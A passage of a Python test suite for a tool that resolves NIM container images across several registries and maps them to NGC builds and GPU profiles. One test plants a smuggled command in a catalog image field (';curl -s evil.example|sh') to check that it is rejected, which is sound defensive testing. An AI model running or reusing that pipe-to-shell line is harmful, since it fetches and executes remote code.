        assert code == 0, payload
        facts = payload["facts"]
        assert (facts["mapping"], facts["ngc_image"], facts["image"]) == (
            "ngc_url",
            f"nvcr.io/{GLM51_ID}:1.8.0-turbo",
            GLM51,
        )
        assert f"{TGC}?page=1&size=100" in requested  # every item: no name holds glm5_1
    assert payload["facts"]["handoff"]["image"] == GLM51


def test_a_tgcr_repository_no_catalog_item_lists_is_not_called_latest(tmp_path: Path) -> None:
    code, payload, _ = run_cnd(
        tmp_path, glm_routes(), "select", "tgcr-gz.turing-agi.com/public/z-ai/glm9"
    )
    assert code == 3, payload
    error = payload["errors"][0]
    assert error["code"] == "ngc_build_unknown"
    assert error["message"].endswith("the TGC catalog lists no image of it")
    assert error["fix"] == nimselect.NGC_BUILD_UNKNOWN_NO_TAG_FIX


def test_a_turingcm_name_takes_the_image_it_names_and_says_the_spark_build_was_not_checked(
    tmp_path: Path,
) -> None:
    # llama-3.1-8b-instruct: the deploy text names the arm64 DGX Spark build first (real)
    harbor = "/api/v2.0/projects/nim/repositories/llama-3.1-8b-instruct/artifacts"
    routes = {
        f"{TURINGCM}/simple-list": (200, cnd_fixture("turingcm-simple-list.json")),
        f"{TURINGCM}/getNimImagesById?id=5": (
            200,
            cnd_fixture("turingcm-detail-llama-3.1-8b-instruct.json"),
        ),
        harbor: (200, [harbor_image(tags=("latest",), version="1.15.3")]),
    }
    code, payload, requested = run_cnd(
        tmp_path, routes, "resolve", "llama-3.1-8b-instruct", "--source", "turingcm"
    )
    assert code == 3, payload
    facts, error = payload["facts"], payload["errors"][0]
    assert facts["cnd_repository"] == "resource.turingcm.com/nim/llama-3.1-8b-instruct"
    spark = "resource.turingcm.com/megacube/llama-3.1-8b-instruct-dgx-spark:latest"
    assert any(f"also names {spark}" in note for note in facts["notes"])
    assert not any("megacube" in path for path in requested)
    # its path names no NGC TEAM/REPO (nim/llama-3.1-8b-instruct): no --nim-version to offer
    assert error["code"] == "ngc_build_unknown" and "names no TEAM/REPO" in error["fix"]
    assert "Do not ask for the image's NGC version" in error["fix"]


def test_a_cnd_image_of_unknown_arch_never_takes_a_multi_arch_builds_archs(
    tmp_path: Path,
) -> None:
    # Qwen3.6-35B-A3B-DGX-Spark on TGC gives no arch; its NGC build is amd64 and arm64
    rid = "nim/qwen/qwen3.6-35b-a3b"
    items = [{"id": 100336, "name": "Qwen3.6-35B-A3B-DGX-Spark"}]
    routes = {
        TGC: (200, {"code": 200, "data": {"items": items, "total": 1}}),
        f"{TGC}/100336": (200, cnd_fixture("tgc-detail-qwen3.6-35b-a3b-dgx-spark.json")),
        "/api/v2.0/projects/public/repositories/qwen%252Fqwen3.6-35b-a3b-spark/artifacts": LOGIN,
        f"/v2/repos/{rid}": (200, {"name": "qwen3.6-35b-a3b", "tags": ["1.7.0-variant"]}),
        f"/v2/repos/{rid}/images": images_body({"1.7.0-variant": BOTH}),
        meta_key(rid, "1.7.0-variant"): FITS,
    }
    code, payload, _ = run_cnd(
        tmp_path, routes, "select", "qwen3.6-35b-a3b-dgx-spark", "--source", "tgcr"
    )
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["cnd_architectures"], facts["ngc_architectures"]) == (None, BOTH)
    assert payload["state"] == "unknown"
    assert "arch_not_recorded" in facts["best_unconfirmed"]["reasons"]
    assert any("built for several (amd64, arm64)" in note for note in facts["notes"])


def test_nim_version_is_not_offered_where_it_cannot_map_the_image(tmp_path: Path) -> None:
    # the path names nim/qwen/qwen3-32b-dgx-spark-s3, which NGC does not have: a version from the
    # user would map to it too, so only the after-pull check is offered, also after a try
    image = "io.chancloud.com/cnd/qwen/qwen3-32b-dgx-spark-s3:1.1.0"
    harbor = "/api/v2.0/projects/cnd/repositories/qwen%252Fqwen3-32b-dgx-spark-s3/artifacts"
    labels = harbor_image(tags=("1.1.0",), arch="arm64", version="1.0.0")
    for extra in ([], ["--nim-version", "1.0.0"]):
        code, payload, _ = run_cnd(
            tmp_path, {f"{harbor}/1.1.0": (200, labels)}, "select", image, *extra
        )
        assert code == 3, payload
        error = payload["errors"][0]
        assert error["code"] == "ngc_build_unknown"
        assert (
            "names nvcr.io/nim/qwen/qwen3-32b-dgx-spark-s3:1.0.0, which cannot be used: NGC has "
            "no public repository nim/qwen/qwen3-32b-dgx-spark-s3"
        ) in error["message"]
        assert "Do not ask for the image's NGC version" in error["fix"]
        assert "--nim-version VERSION" not in error["fix"]


def test_a_tgcr_image_listed_only_as_latest_offers_no_version_its_path_cannot_map(
    tmp_path: Path,
) -> None:
    # GLM-5.2: TGC names nvcr.io/nim/zai-org/glm-5.2 for z-ai/glm-5.2:latest; --nim-version would
    # take nim/z-ai/glm-5.2 from the path, so it is not offered for the image's own tag
    rid = "nim/zai-org/glm-5.2"
    tag = {
        "arch": "amd64",
        "create_time": "2026-10-01 10:00:00",
        "digest": "sha256:" + "9" * 64,
        "docker_url": "tgcr-gz.turing-agi.com/public/z-ai/glm-5.2:latest",
        "ngc_url": f"nvcr.io/{rid}:1.11.1-variant",
        "tag_name": "latest",
    }
    detail = {"id": 1, "name": "GLM-5.2", "image_tags": [tag]}
    routes = {
        TGC: (200, {"code": 200, "data": {"items": [{"id": 1, "name": "GLM-5.2"}], "total": 1}}),
        f"{TGC}/1": (200, {"code": 200, "data": detail}),
        GLM_HARBOR.format("glm-5.2"): LOGIN,
        f"/v2/repos/{rid}": (200, {"name": "glm-5.2", "tags": ["1.11.1-variant"]}),
        f"/v2/repos/{rid}/images": images_body({"1.11.1-variant": ["amd64"]}),
        meta_key(rid, "1.11.1-variant"): FITS,
    }
    code, payload, _ = run_cnd(tmp_path, routes, "select", "glm-5.2", "--source", "tgcr")
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["pinned"], facts["handoff"]["image"], payload["next"]) == (
        False,
        None,
        "ask_user",
    )
    [latest] = [w for w in facts["warnings"] if "listed only as latest" in w]
    assert "--nim-version cannot map a tag TGC does not list" in latest
    assert "nim/z-ai/glm-5.2" in latest and "also pass --nim-version" not in latest
    # the reason says the image is not ready to hand off
    assert "TGC lists it only as latest" in facts["image_choice"]["reason"]


def test_a_cnd_image_of_known_arch_needs_no_ngc_image_list(tmp_path: Path) -> None:
    routes = lichan_routes()
    routes[f"/v2/repos/{QWEN35_ID}/images"] = FORBIDDEN
    code, payload, _ = run_cnd(tmp_path, routes, "resolve", LICHAN_IMAGE)
    assert code == 0, payload
    notes = payload["facts"]["notes"]
    # fit checks the lichan image's own architecture: nothing is unknown for want of NGC's
    assert not any("arch_not_recorded" in note for note in notes)
    assert any(f"those of {LICHAN_IMAGE} (amd64) are checked" in note for note in notes)


@pytest.mark.parametrize(
    ("answer", "code"),
    [(UNAVAILABLE, "ngc_http_error"), ((200, "<html>proxy</html>"), "ngc_bad_response")],
)
def test_ngc_failing_while_checking_a_cnd_build_is_an_external_failure(
    tmp_path: Path, answer: Any, code: str
) -> None:
    routes = lichan_routes()
    routes[f"/v2/repos/{QWEN35_ID}"] = answer
    exit_code, payload, _ = run_cnd(tmp_path, routes, "resolve", LICHAN_IMAGE)
    assert exit_code == 4, payload
    assert (payload["next"], payload["errors"][0]["code"]) == ("fix_errors", code)
    # a repository that is not public is no build of the image
    routes[f"/v2/repos/{QWEN35_ID}"] = FORBIDDEN
    exit_code, payload, _ = run_cnd(tmp_path, routes, "resolve", LICHAN_IMAGE)
    assert exit_code == 3, payload
    assert payload["errors"][0]["code"] == "ngc_build_unknown"
    assert "HTTP 403" in payload["errors"][0]["message"]


def test_fit_never_checks_a_cnd_image_offline_by_its_name(tmp_path: Path) -> None:
    # NGC drops every connection: a --metadata-file is no way to map a CND image by its name
    routes = {
        f"{LICHAN_HARBOR}/1.0.0": (200, cnd_fixture("lichan-artifact-qwen3.5-35b-a3b-1.0.0.json")),
        f"/v2/repos/{QWEN35_ID}": CLOSE,
    }
    metadata = metadata_file("metadata-qwen3.5-35b-a3b-1.7.0-variant.json")
    code, payload, _ = run_cnd(
        tmp_path, routes, "fit", LICHAN_IMAGE, "--tag", "1.0.0", "--metadata-file", metadata
    )
    assert code == 4, payload
    assert payload["errors"][0]["code"] == "ngc_unreachable"
    assert "handoff" not in payload["facts"] and payload["facts"].get("mapping") != "by_name"


def test_a_label_naming_a_tag_ngc_lacks_maps_nothing(tmp_path: Path) -> None:
    # the ngc_url label names a tag NGC lacks: the version label is tried next
    labels = harbor_image(ngc_url=f"nvcr.io/{QWEN35_ID}:9.9.9-variant", version="1.7.0-variant")
    code, payload, _ = run_cnd(tmp_path, lichan_routes(labels), "resolve", LICHAN_IMAGE)
    assert code == 0, payload
    facts = payload["facts"]
    assert (facts["mapping"], facts["ngc_image"]) == ("version_label", QWEN35_NGC)
    assert facts["mappings_tried"][0]["problem"] == f"NGC {QWEN35_ID} has no tag 9.9.9-variant"
    # no other: ngc_build_unknown naming the missing tag, never tag_not_found (the tag is there)
    labels = harbor_image(version="9.9.9-variant")
    code, payload, _ = run_cnd(tmp_path, lichan_routes(labels), "resolve", LICHAN_IMAGE)
    assert code == 3, payload
    error = payload["errors"][0]
    assert error["code"] == "ngc_build_unknown"
    assert f"NGC {QWEN35_ID} has no tag 9.9.9-variant" in error["message"]
    assert error["fix"] == nimselect.NGC_BUILD_UNKNOWN_FIX  # another version can still map


def test_an_index_whose_image_is_missing_is_no_missing_tag(tmp_path: Path) -> None:
    routes = turingcm_routes()
    del routes[f"{TURINGCM_HARBOR}/{TURINGCM_CHILD}"]
    code, payload, _ = run_cnd(
        tmp_path, routes, "resolve", "resource.turingcm.com/qwen/qwen3.6-27b:1.0"
    )
    assert code == 3, payload
    error = payload["errors"][0]
    assert error["code"] == "ngc_build_unknown" and "could not be read" in error["message"]


def test_a_catalog_image_that_is_no_image_reference_never_reaches_the_facts(
    tmp_path: Path,
) -> None:
    routes = tgcr_routes()
    detail = cnd_fixture("tgc-detail-qwen3.6-27b.json")
    hostile = f"{TGCR_REPO}:1.0;curl -s evil.example|sh"
    detail["data"]["image_tags"][0]["docker_url"] = hostile
    routes[f"{TGC}/100341"] = (200, detail)
    code, payload, _ = run_cnd(tmp_path, routes, "select", "qwen3.6-27b", "--source", "tgcr")
    # that item names no image: the other two names match, and the user is asked
    assert (code, payload["errors"][0]["code"]) == (3, "model_ambiguous")
    assert "evil.example" not in json.dumps(payload)


def test_only_locate_checks_google_and_nothing_sends_credentials(tmp_path: Path) -> None:
    routes = {**lichan_routes(metadata=FITS), "/generate_204": (204, "")}
    env_file = str(write_env(tmp_path, h100_env()))
    with serve(routes) as server:
        root = server.base.removesuffix("/v2")
        env = ngc_env(
            server,
            TEST_HARBOR_BASE=root,
            TEST_LOCATE_URL=f"{root}/generate_204",
            NGC_API_KEY="secret-key",
            NGC_CLI_API_KEY="secret-key",
            HF_TOKEN="secret-key",
        )
        for args in (
            ["resolve", LICHAN_IMAGE],
            ["fit", LICHAN_IMAGE, "--env", env_file],
            ["select", LICHAN_IMAGE, "--env", env_file],
        ):
            code, payload = run_cli("nimselect.py", *args, env=env)
            assert code == 0, payload
        assert "/generate_204" not in server.requests
        code, payload = run_cli("nimselect.py", "locate", env={**env, "TZ": "Europe/Berlin"})
        assert code == 0 and payload["facts"]["locality"]["google_reachable"] is True
        assert server.requests.count("/generate_204") == 1
        sent = [{key.lower(): value for key, value in item.items()} for item in server.headers]
    assert all("authorization" not in headers and "cookie" not in headers for headers in sent)
    assert not any("secret-key" in value for headers in sent for value in headers.values())


def test_a_list_row_ignores_notes_when_it_looks_for_fewer_gpus() -> None:
    """A note (tested_in_other_image, pci_inferred) leaves no check open: a 2-GPU profile with the
    same open check as the best unknown one is the row's profile, not the 8-GPU one, nor a 1-GPU
    one that leaves another check open."""

    def record(pid: str, gpus: int, reasons: list[str]) -> dict[str, object]:
        return {"profile_id": pid, "tier": "tested", "reasons": reasons, "gpus_required": gpus,
                "precision": "nvfp4", "backend": "vllm", "verdict": "unknown"}  # fmt: skip

    best = record("eight", 8, ["vram_not_recorded"])
    two = record("two", 2, ["vram_not_recorded", "tested_in_other_image"])
    other = record("other", 1, ["vram_not_recorded", "driver_unknown"])
    result = {"verdict": "unknown", "best_unconfirmed": best, "unconfirmed": [best, two, other]}
    row = nimselect.row_profile(result)
    assert row is not None and row["profile_id"] == "two"
